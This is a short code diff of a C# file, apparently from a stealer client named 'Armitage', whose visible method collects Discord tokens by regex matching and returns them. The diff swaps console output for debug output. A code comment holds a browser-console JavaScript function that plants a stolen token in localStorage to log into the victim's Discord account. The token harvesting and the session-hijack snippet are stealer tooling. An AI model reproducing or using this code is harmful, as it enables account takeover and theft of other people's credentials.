@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Text;
@@ -29,13 +30,13 @@ namespace Client.Armitage.Cookies
                     discordtokens.Add(match.Value + "\n");
             }
 
-            Console.WriteLine(discordtokens);
+            Debug.WriteLine(discordtokens);
 
             return discordtokens.ToList();
         }
         /*
         To log in:
-            Open Console on browser.
+            Open Debug on browser.
                 > function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }
                 > login("token")
          */
